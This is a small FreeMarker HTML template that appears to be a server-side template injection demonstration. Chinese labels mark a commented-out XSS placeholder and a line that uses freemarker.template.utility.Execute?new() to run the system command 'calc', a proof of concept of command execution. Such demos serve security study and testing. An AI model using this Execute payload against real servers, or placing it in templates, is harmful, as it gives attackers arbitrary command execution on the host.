<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>calc</title>
</head>
<body>
Hello ${title}! I'm ${app}<br/>
<#--xss注入：${xss} <br/>-->
弹计算器：<#assign value="freemarker.template.utility.Execute"?new()>
${value("calc")}

</body>
</html>